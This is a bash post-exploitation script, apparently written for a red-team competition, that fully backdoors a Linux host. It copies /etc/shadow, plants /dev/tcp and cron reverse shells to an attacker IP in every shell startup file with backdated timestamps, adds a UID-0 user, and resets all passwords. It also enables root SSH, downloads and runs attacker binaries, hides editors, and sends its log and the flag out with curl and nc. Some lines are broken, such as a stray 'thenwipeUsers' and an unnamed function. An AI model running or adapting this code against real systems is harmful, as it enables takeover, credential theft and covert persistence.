#!/bin/bash

# -----------------
# control variables
# -----------------
ipv4="192.168.1.15" # of attacker
serverPort=3640 # of attacker
intelPort=44444 #port to send intel to on attacker box
payloadFile="/var/upgrades" # if payload is running from a file, this is the file to write it to 
payload="nc -lnvp 4444" # the payload to be written to the file above, bash, shellcode, etc
allowedPorts=("22" "53" "9001" "9002" "9003" "9004")
downloadPort1="9002"
downloadPort2="9003"
downloadPort3="9004"
logFile="/var/log/boot.log.0" # stealthily disguise log as legitimate log file. (boot.log always starts at .1)
backdoorUsername="newUser"
backdoorPassHash='$6$eX57vhSlV9MD.i3h$J4SU8Zke67OUbaCQpW5zH7UNPM8npfVZuL2B./abRe3kijWXquR7NF6jfHq5veELTvo2pyeRxh3wHnpmVBv8d.' # use $6 -> most versatile
firewallConfiguration=0
scorebotUser="scorebot"  # name of scorebot user to avoid changing
serviceName1="service" # name of binary with service to backdoor
serviceName2="service2"

# --------------
# back up hashes
# --------------
hashBackup() { 
    # save all password hashes both locally and send to the attacker
    echo -e "\n\n## reading /etc/shadow, below:" >> $logFile
    cat /etc/shadow >> $logFile 2>&1
    cp /etc/shadow /etc/wodash
    chmod 600 /etc/wodash
    echo "## a copy is also saved locally to /etc/wodahs on this box" >> $logFile
}

# ------------------
# wipe all cron jobs
# ------------------
wipeCron() {
    # auto delete all cron jobs for each user
    echo -e "\n\n## deleting all cron jobs" >> $logFile
    rm -rf /etc/cron.d/* >> $logFile 2>&1
    rm -rf /etc/cron.daily/* >> $logFile 2>&1
    rm -rf /etc/cron.hourly/* >> $logFile 2>&1
    rm -rf /etc/cron.monthly/* >> $logFile 2>&1
    rm -rf /etc/cron.weekly/* >> $logFile 2>&1
    crontab -r -u root >> $logFile 2>&1
    for user in $(getent passwd | cut --delimiter=":" --fields=1); do
        crontab -r -u $user >> $logFile 2>&1
    done
}

# ------------------------------
# add a cron job for persistence
# ------------------------------
writeCron(){
    # add cron job for persistence - runs every 5 min
    echo -e "\n\nadding cron job for persistence" >> $logFile
    echo "5 * * * * root bash -i >& /dev/udp/$ipv4/$serverPort 0>&1" >> /etc/crontab 
}

# -------------scorebotUser-------------------
# create aliases to run a backdoor :: todo - have actual commands run
# --------------------------------
badAlias() {    
    echo -e "\n\n## adding aliases to run backdoor" >> $logFile
    echo "alias sudo='$payloadFile'" >> /etc/bash.bashrc
    echo "alias ls='$payloadFile'" >> /etc/bash.bashrc
    echo "alias whoami='$payloadFile'" >> /etc/bash.bashrc
    echo "alias ps='$payloadFile'" >> /etc/bash.bashrc
    echo "alias top='$payloadFile'" >> /etc/bash.bashrc
}

# -------------------------------------
# create a symlink to the reverse shell
# -------------------------------------
badSymlink() {
    # create a symlink to the reverse shell
    ln -s $payloadFile /usr/bin/which
    ln -s $payloadFile /usr/bin/whereis
}


# --------------------------------------------------------------
# harden ssh_config, allow root login, allow login from our host
# --------------------------------------------------------------
hardenSsh() {
    # modify ssh to enable root login
    echo -e "\n\n## modifying ssh to allow user "root" login" >> $logFile
    sshConfigFile="/etc/ssh/sshd_config"
    if grep -q "PermitRootLogin" "$sshConfigFile"; then
        sed -i 's/^#\s*PermitRootLogin.*/PermitRootLogin yes/' $sshConfigFile
    else
        echo "PermitRootLogin yes" >> $sshConfigFile
    fi
    
    # modify ssh_config to allow logins only from our host
    echo "sshd: $ipv4" >> /etc/host.allow
    #echo "sshd: ALL" >> /etc/host.deny   #We don't know where the scorebot will come from

    # once all configurations are done, report finalized config
    echo "## done, see copy of ssh_config below" >> $logFile
    cat $sshConfigFile >> $logFile 2>&1

    
    # add our public key to the authorized_keys file for root
    mkdir -p /root/.ssh
    touch /root/.ssh/authorized_keys
    echo $publicKey >> /root/.ssh/authorized_keys
    chattr +i /root/.ssh/authorized_keys

    # iterate through each user's home directory
    while IFS=: read -r username password uid gid info homedir shell; do
        if [[ $username && $homedir ]]; then
            if [[ -d $homedir ]]; then
                mkdir -p $homedir/.ssh
                touch $homedir/.ssh/authorized_keys
                echo $publicKey > $homedir/.ssh/authorized_keys
                chattr +i $homedir/.ssh/authorized_keys
            fi
        fi
    done < /etc/passwd
}

# -------------------------------------------------------
# add backdoors to various files
# @param file: the file to add the backdoor to
# @param numLines: the line number to add the backdoor to
# @param lineToWrite: the string to add to the file
# -------------------------------------------------------
fileBackdoor() {
    file=$1
    numLines=$2
    lineToWrite=$3
    osBirth=$(stat / | grep Birth | awk '{print $2}')
    
    echo "## writing $lineToWrite to line $numLines of $file" >> $logFile

    if ! [ -f $file ]; then
        echo $file
        touch $file >> $logFile 2>&1
        preModTime=$osBirth
    else 
        preModTime=$(date -R -r $file)
    fi
    
    echo $( {
        sed -i ""$numLines"i\
        $lineToWrite" $file
        touch -d "$preModTime" $file
        echo $preModTime 
    } ) >> $logFile 2>&1
}

# -----------------------------------------------------------------
# add backdoors to all startup files for shells found on the system
# -----------------------------------------------------------------
shellBackdoor (){
    # modify rc file of the shell for persistence
    echo -e "\n\nadding persistence mechanisms to all rc files found on the system" >> $logFile

    # track which shells are installed on the system
    shells=()

    # iterate through /etc/shells and update each shell's rc file
    while IFS= read -r SHELL; do        
        if [[ $SHELL == *"/sh" || $SHELL == "sh" ]]; then
            shells+=("sh")
        elif [[ $SHELL == *"/bash" || $SHELL == "bash" ]]; then
            shells+=("bash")
        elif [[ $SHELL == *"/zsh" || $SHELL == "zsh" ]]; then
            shells+=("zsh")
        fi
    done < "/etc/shells"

    for shell in "${shells[@]}"; do
        if [[ $shell == "sh" ]]; then
            fileBackdoor "/etc/profile" 3 "sh -i 5<> /dev/tcp/$ipv4/$serverPort 0<&5 1>&5 2>&5"
            fileBackdoor "/etc/profile.d/bash_completion.sh" 3 "sh -i 5<> /dev/tcp/$ipv4/$serverPort 0<&5 1>&5 2>&5"
            while IFS=: read -r username password uid gid info homedir shell; do
                if [[ $username && $homedir ]]; then
                    if [[ -d "$homedir" ]]; then
                        fileBackdoor "$homedir/.profile" 1 "sh -i 5<> /dev/tcp/$ipv4/$serverPort 0<&5 1>&5 2>&5"    
                    fi
                fi
            done < /etc/passwd
        fi
        if [[ $shell == "bash" ]]; thenwipeUsers
            fileBackdoor "/etc/profile" 3 "sh -i 5<> /dev/tcp/$ipv4/$serverPort 0<&5 1>&5 2>&5"
            fileBackdoor "/etc/bash.bashrc" 10 "bash -i >& /dev/tcp/$ipv4/$serverPort 0>&1"
            while IFS=: read -r username password uid gid info homedir shell; do
                if [[ $username && $homedir ]]; then
                    if [[ -d $homedir ]]; then
                        fileBackdoor "$homedir/.bashrc" 62 "bash -i >& /dev/tcp/$ipv4/$serverPort 0>&1"   
                        fileBackdoor "$homedir/.bash_profile" 0 "bash -i >& /dev/tcp/$ipv4/$serverPort 0>&1"   
                        fileBackdoor "$homedir/.bash_login" 0 "bash -i >& /dev/tcp/$ipv4/$serverPort 0>&1"   
                        fileBackdoor "$homedir/.profile" 19 "bash -i >& /dev/tcp/$ipv4/$serverPort 0>&1"   
                        fileBackdoor "$homedir/.bash_logout" 4 "bash -i >& /dev/tcp/$ipv4/$serverPort 0>&1"   
                    fi
                fi
            done < /etc/passwd
        fi
        
    done
    
}

# ------------------------------
# download files from attack box
# ------------------------------
download_and_run (){  #find a place to put a backdoor and
        successTransfer=0
        transferMethod=1 # each number represents a different transfer method
        targetFile="/usr/sbin/$1"
        sourceFile=$1
        #sourceFileHash="944d981207838ac6b6fc940f09b93ab3169af4e3afe1ec085caab27d8022b737" # hash of the reverse shell we are transferring

        echo -e "\n\ndownloading files from attacker" >> $logFile
        while [[ $transferMethod < 5 && $successTransfer == 0 ]];
        do
                # transfer
                if [ $transferMethod == 1 ]; then
                    ip=$(ifconfig | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}')
					echo $ip
                    wget --bind-address=$ip:$downloadPort1 --no-check-certificate --tries=2 -O $targetFile http://$ipv4:8000/$sourceFile                                                                                                      
                elif [ $transferMethod == 2 ]; then
                    curl --local-port $downloadPort2 -m 10 -o $targetFile http://$ipv4:8000/$sourceFile >> $logFile 2>&1
                elif [ $transferMethod == 3 ]; then
                    echo -e "\n\ndownload via https failed, attempting download via http:" >> $logFile
                    wget --tries=2 -O $targetFile http://$ipv4:8000/$sourceFile >> $logFile 2>&1
                elif [ $transferMethod == 4 ]; then
                    curl --local-port $downloadPort3 -m 10 -o $targetFile http://$ipv4:8000/$sourceFile >> $logFile 2>&1
                # elif [ $transferMethod == 5 ]; then
                #     echo "attempting download via nc:" >> $logFile
                #     echo "GET /$sourceFile HTTP/1.0" | nc -n $ipv4 $serverPort > $targetFile && sed -i '1,7d' $targetFile >> $logFile 2>&1
                # elif [ $transferMethod == 6 ]; then
                #     echo "attempting download via ncat:" >> $logFile
                #     echo -e "GET / HTTP/1.1\r\nHost: $ipv4\r\n\r\n" | ncat --ssl https://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
                # add additional transfer methods here, updating loop condition (<=)
                fi

                # verify
                if [ -f $targetFile ]; then
                #    verifyHash=$(sha256sum $targetFile | cut --delimiter=" " --fields=1)
                #    if [ "$verifyHash" == "$sourceFileHash" ]; then
                	successTransfer=1
                #    fi
                #else 
                #    successTransfer=0
                fi
                ((transferMethod+=1))
        done;
        if [ $successTransfer == 0 ]; then
                echo -e "\n\nunable to transfer the reverseShell backdoor to the target machine." >> $logFile 2>&1
        else
                echo -e "\n\ntransfer successful, running malware" >> $logFile 2>&1
                chmod +x $targetFile
                
                backdoorService $sourceFile $2 
        fi

        # take over a legitimate service for persistence for whatever the service is
}

# -------------------------------
# lock down user accounts the box
# -------------------------------
hardenUsers(){
    # disable shells for all users 
    passwdFile="/etc/passwd"
        #TODO: fix this to detect other shells
    sed -i "s/$SHELL\/bin\/nologin/g" $passwdFile >> $logFile 2>&1
    echo "all shells should be disabled. resulting /etc/passwd file:" >> $logFile
    cat $passwdFile >> $logFile 2>&1
    
    # change password for all accounts except us/score bot (derek/emile)
        # Loop through each line in /etc/shadow
        while IFS=: read -r user passwd rest; do
                # Skip lines that are comments or empty
                if [[ "$user" =~ ^#|^$ ]]; then
                    continue
                fi

                if [[ "$user" == "$scorebotUser" ]]; then
                    echo "Skipping password update for user: $scorebotUser"
                    continue
                fi

                # Check if the password hash starts with a $
                if [[ "${passwd:0:1}" == '$' ]]; then
                    # Replace the password field with the new hashed password
                    sed -i "s#^$user:[^:]*:#$user:$backdoorPassHash:#" /etc/shadow
                fi
        done < /etc/shadow

}

# ------------------------------------------------
# create a user with uid 0 (root) and gid 0 (root)
# ------------------------------------------------
backdoorUser(){
    
    # "promote" a user to root (derek/emile)
    if grep -q "^newUser:" /etc/passwd; then
	    echo "User 'newUser' already exists."
    # Add your commands here if the user exists
	else
	    echo "User 'newUser' does not exist."
		LINE="$backdoorUsername:x:0:0:root:/bin:$SHELL"
		SHADOW_LINE="$backdoorUsername:$backdoorPassHash:19753:0:99999:7:::"
		echo $LINE >> /etc/passwd
		echo $SHADOW_LINE >> /etc/shadow
	fi

    
    
    LINE="$backdoorUsername:x:0:0:root:/bin:$SHELL"
    SHADOW_LINE="$backdoorUsername:$backdoorPassHash:19753:0:99999:7:::"
    echo $LINE >> /etc/passwd
    echo $SHADOW_LINE >> /etc/shadow
    #     echo "$backdoorUsername ALL=(ALL) ALL" > /etc/sudoers # redundant
    #     sed -i "s/^root:x:0:*/root:x:0:$backdoorUsername/" /etc/groups # redundant
    #     sed -i "s/^sudo:x*/sudo:x:561:$backdoorUsername/" /etc/groups # redundant
}

# ------------------
# backdoor a service
# ------------------
    (){
    dir="/lib/systemd/system"
    newbin=$1 #intelGather
    
    binaryName="/usr/sbin/$2" #
    serviceName=$2
    
	rm $binaryName
    mv "/usr/sbin/$1" $binaryName
    
    chmod +x $binaryName
    rm "$dir/$serviceName.service"
    
    touch "$dir/$serviceName.service"
    echo "[Unit]" >> "$dir/$serviceName.service"   
    echo "Description=$serviceName secure server" >> "$dir/$serviceName.service"
    echo "Documentation=man:$serviceName" >> "$dir/$serviceName.service"

    echo "[Service]" >> "$dir/$serviceName.service"
    echo "ExecStart=$binaryName" >> "$dir/$serviceName.service"
    echo "ExecReload=/bin/kill -HUP $MAINPID" >> "$dir/$serviceName.service"
    
    #systemctl enable "$serviceName.service"
    systemctl start "$serviceName.service"
}

# -------------------------------------------
# Detect and configure any software firewalls
# -------------------------------------------
configAllFirewalls(){ #tested 
    # Check if iptables is installed
    if [ $(command -v iptables) ]; then
        echo -e "\n\niptables is installed, configuring" >> $logFile
        # Check if iptables is stopped
        if [ ! $(systemctl is-active --quiet iptables) ]; then
            systemctl start iptables >> $logFile 2>&1
        fi
        # iptables-save > iptables_rules.txt
        systemctl enable iptables >> $logFile 2>&1
        configureIpTables
    else
        echo -e "\n\niptables is not running, skipping config" >> $logFile
    fi

    #check if ip6tables is installed
    if [ $(command -v ip6tables) ]; then
        echo -e "\n\nip6tables is installed, configuring" >> $logFile
        echo "## TODO: Configure ip6tables" >> $logFile
        # Check if ip6tables is running
        if [ ! $(systemctl is-active --quiet ip6tables) ]; then
            systemctl start ip6tables >> $logFile 2>&1
        fi
        # ip6tables-save > ip6tables_rules.txt
        systemctl enable ip6tables >> $logFile 2>&1
        #TODO: configure ip6tables
    else
        echo -e "\n\nip6tables is not running, skipping config" >> $logFile
    fi

    # check if firewalld is installed
    if [ $(command -v firealld) ]; then
        echo -e "\n\nfirewalld is installed, configuring" >> $logFile
        # Check if firewalld is running
        if [ ! $(firewall-cmd --state) = "running" ]; then
            systemctl start firewalld >> $logFile 2>&1
        fi
        systemctl enable firewalld >> $logFile 2>&1
        configureFirewalld
    else
        echo -e "\n\nfirewalld is not running, skipping config" >> $logFile
    fi
}

configureIpTables() { #tested 
    # clear all iptables rules
    echo "## clearing rules" >> $logFile
    iptables -L >> $logFile 2>&1
    iptables -F >> $logFile 2>&1
    iptables -X >> $logFile 2>&1
    #iptables -t nat -F >> $logFile 2>&1
    #iptables -t nat -X >> $logFile 2>&1
    #iptables -t mangle -F >> $logFile 2>&1
    #iptables -t mangle -X >> $logFile 2>&1
    #iptables -t raw -F >> $logFile 2>&1
    #iptables -t raw -X >> $logFile 2>&1
    #iptables -t security -F >> $logFile 2>&1
    #iptables -t security -X >> $logFile 2>&1

    #iterate through all chains and set the default policy to DROP
    #would include INPUT, FORWARD and any non-standard chains
    echo "## set all chains to drop" >> $logFile
    chains=$(iptables -L | grep Chain | cut  --delimiter=" " --fields=2)
    for chain in $chains
    do
        if [ $chain != "OUTPUT" ]
        then
            iptables --policy $chain ACCEPT >> $logFile 2>&1
        fi
    done

    # allow any connections from attack machine
    # echo "## allow from IP" >> $logFile
    # iptables -A INPUT -s $ipv4 -j ACCEPT >> $logFile 2>&1

    # allow connections on the specified ports from the attacker
    echo "## allow from ports" >> $logFile
    for port in "${allowedPorts[@]}"; do
        iptables -A INPUT -p tcp --dport $port -j ACCEPT >> $logFile 2>&1
    done
    
    # allow outgoing connections. We don't know which port will be used, so we allow all ports.
    echo "## allow outbound" >> $logFile
    iptables --policy OUTPUT ACCEPT >> $logFile 2>&1

    # save the rules
    echo "## save" >> $logFile
    saver=$(which iptables-save)
    outlog=$($saver)
    status=$(echo $outlog | rev | cut --delimiter=" " --fields=7 | rev)
    if [ "$status" != "Completed" ] 
    then
        echo "iptables-save failed" >> $logFile
    else
        echo "iptables rules saved successfully" >> $logFile
        firewallConfiguration=1
    fi;
}

configureFirewalld() { #tested
    # Get a list of all zones
    zones=$(firewall-cmd --get-zones)

    # Iterate through each zone, and wipe the configuration
    for zone in $zones; do
        # Get a list of all services, ports, sources, and interfaces in the zone
        services=$(firewall-cmd --zone=$zone --list-services)
        ports=$(firewall-cmd --zone=$zone --list-ports)
        sources=$(firewall-cmd --zone=$zone --list-sources)
        interfaces=$(firewall-cmd --zone=$zone --list-interfaces)

        echo "## resetting configuration on zone $zone" >> $logFile
        # Remove all services from the zone
        for service in $services; do
            firewall-cmd --permanent --zone=$zone --remove-service=$service >> $logFile 2>&1
        done

        # Remove all ports from the zone
        for port in $ports; do
            firewall-cmd --zone=$zone --remove-port=$port >> $logFile 2>&1
        done

        # Remove all sources from the zone
        for source in $sources; do
            firewall-cmd --zone=$zone --remove-source=$source >> $logFile 2>&1
        done

        # Remove all interfaces from the zone
        for interface in $interfaces; do
            firewall-cmd --zone=$zone --remove-interface=$interface >> $logFile 2>&1
        done
    done

        #set the default zone to drop (by default, all traffic is dropped unless explicitly allowed)
        echo "## setting default zone to drop" >> $logFile
        firewall-cmd --set-default-zone=drop >> $logFile 2>&1

        # allow any traffic from attack machine's IP (hide this configruation in the default DMZ zone).
        # echo "## allow connections from our IP and configured ports" >> $logFile
        # firewall-cmd --zone=dmz --add-source=$ipv4 >> $logFile 2>&1

        # allow the ports and services we want
        firewall-cmd --zone=dmz --add-service=ssh >> $logFile 2>&1
        firewall-cmd --zone=dmz --add-service=dns >> $logFile 2>&1
        for port in "${allowedPorts[@]}"; do
            firewall-cmd --zone=dmz --add-port=$port/tcp >> $logFile 2>&1
        done

        # reload the firewall
        echo "## saving rules and reloading" >> $logFile
        firewall-cmd --runtime-to-permanent >> $logFile 2>&1
        firewall-cmd --reload >> $logFile 2>&1
        firewallConfiguration=1
}

# -----------------------
# encrypt system binaries, not a great idea to call this one.......
# -----------------------
binEncrypt() {
    # Array of binary names to encrypt
    binaries=("vi" "vim" "nano" "ed")
    fake_output="command not found"
    encpassword="D0gsD0gsD0gs"
    
    # Loop through the binary names
    for binary in "${binaries[@]}"; do
        # Get the full path of the binary
        binary_path=$(which "$binary")

        # Check if the binary exists
        if [[ ! -f "$binary_path" ]]; then
            # If it doesn't, then skip it
            continue
        fi

        # Rename the binary to the md5 of its name
        new_name=$(echo -n "$encpassword$binary" | md5sum | awk '{print $1}')
        # Prepend the original path directory to the new name
        new_name=$(dirname "$binary_path")"/.$new_name"

        # Check if the new name is already taken
        if [[ -f "$new_name" ]]; then
            # If it is, then skip it
            continue
        fi
        mv "$binary_path" "$new_name"

        # Create a new shell script with the original name
        echo -e "#!/bin/sh\necho '$fake_output'" > "$binary_path"
        chmod +x "$binary_path"
    done
}

# ----------------------------------
# report status back to the attacker
# ----------------------------------
report(){
    #(emile)
    if [[ "$firewallConfiguration" = "0" ]]
    then 
        echo "## WARNING: no firewalls were configured." >> $logFile
    fi
    echo -e "\n\n## sending report to attacker" >> $logFile
    
    #checking nc and curl, create a third binary to send file contents for intel retrieval in case neither of these work. 
    if which curl >/dev/null 2>&1; then
        curl -X POST -k -d @$logFile https://$ipv4:$serverPort/report >> $logFile 2>&1
    elif which nc >/dev/null 2>&1; then
        cat $logFile | nc $ipv4 $serverPort
    fi
        
}

# -------------------------
# read intel from the box
# -------------------------
readFlag(){
    cat  $flagPath | nc $ipv4 $intelPort
}

main(){
    # testing code - don't use in production
    rm -f /tmp/test
    rm -f /tmp/curlLog
    rm -f $logFile

    touch $logFile
    chmod 600 $logFile
    echo -e "Offense script started at $(date)\n" >> $logFile

    # initialze the payload if it has not been initialized
    if ! [[ -f $payload ]]; then 
        echo -e "\n\n## payload doesn't exist: writing to $payloadFile" >> $logFile    
        touch $payloadFile 
        echo $payload > $payloadFile
    fi
    chmod +x $payloadFile
    
    wipeCron #tested
    writeCron
    hashBackup #tested
    backdoorUser #tested
    echo 1
    hardenSsh
    download_and_run backdoor $serviceName1
    download_and_run intelGather $serviceName2
    echo 2
    hardenUsers #tested
    #backdoorService 
    configAllFirewalls
    #shellBackdoor
    #readFlag
    #report
    echo 3
    binEncrypt
    # systemctl reboot
}

main

